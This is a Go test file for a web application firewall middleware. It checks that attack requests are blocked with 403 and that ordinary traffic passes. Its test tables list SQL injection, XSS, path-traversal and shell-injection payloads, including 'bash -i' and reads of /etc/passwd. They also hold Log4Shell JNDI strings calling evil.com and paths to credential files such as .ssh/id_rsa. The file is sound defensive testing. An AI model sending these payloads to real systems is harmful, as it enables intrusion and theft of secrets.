package waf

import (
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"testing"
)

var dummyHandler = http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
	w.WriteHeader(http.StatusOK)
})

func newTestMiddleware(t *testing.T) http.Handler {
	t.Helper()
	mw := NewMiddleware(Config{Enabled: true}, slog.Default())
	return mw(dummyHandler)
}

func newBenchMiddleware() http.Handler {
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	mw := NewMiddleware(Config{Enabled: true}, logger)
	return mw(dummyHandler)
}

func assertBlocked(t *testing.T, handler http.Handler, r *http.Request) {
	t.Helper()
	rr := httptest.NewRecorder()
	handler.ServeHTTP(rr, r)
	if rr.Code != http.StatusForbidden {
		t.Errorf("expected 403 Forbidden, got %d for %s %s", rr.Code, r.Method, r.URL.String())
	}
}

func assertAllowed(t *testing.T, handler http.Handler, r *http.Request) {
	t.Helper()
	rr := httptest.NewRecorder()
	handler.ServeHTTP(rr, r)
	if rr.Code == http.StatusForbidden {
		t.Errorf("expected pass-through, got 403 Forbidden for %s %s", r.Method, r.URL.String())
	}
}

func TestWAFDisabled(t *testing.T) {
	mw := NewMiddleware(Config{Enabled: false}, slog.Default())
	handler := mw(dummyHandler)
	r := httptest.NewRequest(http.MethodGet, "/test?id=1'+OR+1=1--", nil)
	assertAllowed(t, handler, r)
}

func TestHealthzExempt(t *testing.T) {
	handler := newTestMiddleware(t)
	r := httptest.NewRequest(http.MethodGet, "/healthz?x=<script>alert(1)</script>", nil)
	assertAllowed(t, handler, r)
}

func TestSQLInjection(t *testing.T) {
	handler := newTestMiddleware(t)
	tests := []struct {
		name string
		uri  string
	}{
		{"union select", "/search?q=1+UNION+SELECT+*+FROM+users"},
		{"drop table", "/api?x=foo;+DROP+TABLE+users"},
		{"tautology single", "/login?user=admin'%20OR%20'1'='1"},
		{"comment close", "/page?id=1'%20;%20--"},
		{"sleep timing", "/api?id=1;sleep(5)"},
		{"benchmark timing", "/api?id=1;benchmark(1000000,md5('a'))"},
		{"hex literal", "/api?val=0x414243"},
		{"inline comment", "/api?q=1/**/OR/**/1=1"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := httptest.NewRequest(http.MethodGet, tt.uri, nil)
			assertBlocked(t, handler, r)
		})
	}
}

func TestXSS(t *testing.T) {
	handler := newTestMiddleware(t)
	tests := []struct {
		name string
		uri  string
	}{
		{"script tag", "/page?q=<script>alert(1)</script>"},
		{"javascript uri", "/page?url=javascript:alert(1)"},
		{"event handler", "/page?x=foo+onerror=alert(1)"},
		{"img onerror", "/page?x=<img+src=x+onerror=alert(1)>"},
		{"iframe", "/page?x=<iframe+src=evil.com>"},
		{"document cookie", "/page?x=document.cookie"},
		{"eval call", "/page?x=eval('payload')"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := httptest.NewRequest(http.MethodGet, tt.uri, nil)
			assertBlocked(t, handler, r)
		})
	}
}

func TestPathTraversal(t *testing.T) {
	handler := newTestMiddleware(t)
	tests := []struct {
		name string
		uri  string
	}{
		{"dot-dot slash", "/static/../../../etc/passwd"},
		{"encoded slash", "/static/..%2f..%2f..%2fetc/passwd"},
		{"encoded backslash", "/static/..%5c..%5c..%5cwindows/system32"},
		{"null byte", "/file%00.php"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := httptest.NewRequest(http.MethodGet, tt.uri, nil)
			assertBlocked(t, handler, r)
		})
	}
}

func TestShellInjection(t *testing.T) {
	handler := newTestMiddleware(t)
	tests := []struct {
		name string
		uri  string
	}{
		{"command substitution", "/api?cmd=$(whoami)"},
		{"pipe to cat", "/api?x=foo|cat+/etc/passwd"},
		{"semicolon bash", "/api?x=foo;bash+-i"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := httptest.NewRequest(http.MethodGet, tt.uri, nil)
			assertBlocked(t, handler, r)
		})
	}
}

func TestLog4Shell(t *testing.T) {
	handler := newTestMiddleware(t)
	tests := []struct {
		name string
		uri  string
	}{
		{"jndi ldap", "/api?x=${jndi:ldap://evil.com/a}"},
		{"jndi rmi", "/api?x=${jndi:rmi://evil.com/a}"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := httptest.NewRequest(http.MethodGet, tt.uri, nil)
			assertBlocked(t, handler, r)
		})
	}
}

func TestLog4ShellInHeader(t *testing.T) {
	handler := newTestMiddleware(t)
	r := httptest.NewRequest(http.MethodGet, "/", nil)
	r.Header.Set("X-Forwarded-For", "${jndi:ldap://evil.com/a}")
	assertBlocked(t, handler, r)
}

func TestScannerUA(t *testing.T) {
	handler := newTestMiddleware(t)
	agents := []string{
		"sqlmap/1.5",
		"Nikto/2.1.6",
		"Nmap Scripting Engine",
		"Mozilla/5.0 (nuclei)",
		"zgrab/0.x",
		"dirbuster",
		"gobuster/3.1",
		"acunetix",
		"havij",
	}
	for _, ua := range agents {
		t.Run(ua, func(t *testing.T) {
			r := httptest.NewRequest(http.MethodGet, "/", nil)
			r.Header.Set("User-Agent", ua)
			assertBlocked(t, handler, r)
		})
	}
}

func TestHeaderInjection(t *testing.T) {
	handler := newTestMiddleware(t)
	r := httptest.NewRequest(http.MethodGet, "/", nil)
	r.Header.Set("X-Custom", "value\r\nInjected: header")
	assertBlocked(t, handler, r)
}

func TestSensitiveFilePaths(t *testing.T) {
	handler := newTestMiddleware(t)
	paths := []string{
		"/.env",
		"/.git/config",
		"/.git",
		"/wp-admin/install.php",
		"/wp-login.php",
		"/phpmyadmin/",
		"/cgi-bin/test.cgi",
		"/.aws/credentials",
		"/.ssh/id_rsa",
		"/etc/passwd",
		"/etc/shadow",
		"/.docker/config.json",
		"/.kube/config",
	}
	for _, p := range paths {
		t.Run(p, func(t *testing.T) {
			r := httptest.NewRequest(http.MethodGet, p, nil)
			assertBlocked(t, handler, r)
		})
	}
}

func TestProtocolAttack(t *testing.T) {
	handler := newTestMiddleware(t)
	tests := []struct {
		name string
		uri  string
	}{
		{"php tag", "/page?x=<?php+echo+1;?>"},
		{"data base64", "/page?x=data:text/html;base64,PHNjcmlwdD4="},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := httptest.NewRequest(http.MethodGet, tt.uri, nil)
			assertBlocked(t, handler, r)
		})
	}
}

func TestLegitimateRequestsAllowed(t *testing.T) {
	handler := newTestMiddleware(t)
	tests := []struct {
		name string
		uri  string
		ua   string
	}{
		{"simple GET", "/", "Mozilla/5.0"},
		{"API call", "/v1/tunnels/register", "expose-client/1.0"},
		{"static asset", "/assets/style.css", "Mozilla/5.0"},
		{"query param", "/search?q=hello+world", "Mozilla/5.0"},
		{"json api", "/api/data?page=2&limit=50", "Mozilla/5.0"},
		{"path with dots", "/files/report.v2.pdf", "Mozilla/5.0"},
		{"websocket connect", "/v1/tunnels/connect", "expose-client/1.0"},
		{"numeric query", "/items?id=42&sort=name", "Chrome/120"},
		{"complex path", "/api/v2/users/123/profile", "Safari/17"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := httptest.NewRequest(http.MethodGet, tt.uri, nil)
			if tt.ua != "" {
				r.Header.Set("User-Agent", tt.ua)
			}
			assertAllowed(t, handler, r)
		})
	}
}

func TestCustomHeadersAllowed(t *testing.T) {
	handler := newTestMiddleware(t)
	r := httptest.NewRequest(http.MethodGet, "/api/data", nil)
	r.Header.Set("X-Request-ID", "abc-123-def")
	r.Header.Set("X-Correlation-ID", "550e8400-e29b-41d4-a716-446655440000")
	r.Header.Set("User-Agent", "MyApp/1.0")
	assertAllowed(t, handler, r)
}

func TestNormalizeHostCanonicalizesIPv6AndPort(t *testing.T) {
	t.Parallel()

	cases := map[string]string{
		"Example.com:443":       "example.com",
		"[2001:db8::1]:10443":   "2001:db8::1",
		"2001:db8::1":           "2001:db8::1",
		"sub.example.com.":      "sub.example.com",
		"  LOCALHOST:8080  ":    "localhost",
		"[2001:db8::2]":         "2001:db8::2",
		"[2001:db8::2]:invalid": "2001:db8::2",
	}

	for in, want := range cases {
		if got := normalizeHost(in); got != want {
			t.Fatalf("normalizeHost(%q): got %q, want %q", in, got, want)
		}
	}
}

func TestBlockEventUsesCanonicalHost(t *testing.T) {
	t.Parallel()

	var gotHost string
	handler := NewMiddleware(Config{
		Enabled: true,
		OnBlock: func(evt BlockEvent) {
			gotHost = evt.Host
		},
	}, slog.New(slog.NewTextHandler(io.Discard, nil)))(dummyHandler)

	r := httptest.NewRequest(http.MethodGet, "/search?q=1+UNION+SELECT+*+FROM+users", nil)
	r.Host = "[2001:db8::10]:10443"
	assertBlocked(t, handler, r)

	if gotHost != "2001:db8::10" {
		t.Fatalf("expected canonical host in block event, got %q", gotHost)
	}
}

func BenchmarkWAFCleanRequest(b *testing.B) {
	handler := newBenchMiddleware()
	r := httptest.NewRequest(http.MethodGet, "/api/data?page=1&limit=20", nil)
	r.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)")
	r.Header.Set("Accept", "text/html")
	r.Header.Set("X-Request-ID", "abc-123")
	rr := httptest.NewRecorder()

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		handler.ServeHTTP(rr, r)
	}
}

func BenchmarkWAFMaliciousRequest(b *testing.B) {
	handler := newBenchMiddleware()
	r := httptest.NewRequest(http.MethodGet, "/search?q=1+UNION+SELECT+*+FROM+users", nil)
	r.Header.Set("User-Agent", "sqlmap/1.5")
	rr := httptest.NewRecorder()

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		handler.ServeHTTP(rr, r)
	}
}

func BenchmarkWAFCleanRequestDiscardLogger(b *testing.B) {
	handler := newBenchMiddleware()
	r := httptest.NewRequest(http.MethodGet, "/api/data?page=1&limit=20", nil)
	r.Header.Set("User-Agent", "Mozilla/5.0")
	r.Header.Set("X-Request-ID", "abc-123")
	rr := httptest.NewRecorder()

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		handler.ServeHTTP(rr, r)
	}
}

func BenchmarkWAFMaliciousRequestDiscardLogger(b *testing.B) {
	handler := newBenchMiddleware()
	r := httptest.NewRequest(http.MethodGet, "/search?q=1+UNION+SELECT+*+FROM+users", nil)
	r.Header.Set("User-Agent", "sqlmap/1.5")
	rr := httptest.NewRecorder()

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		handler.ServeHTTP(rr, r)
	}
}
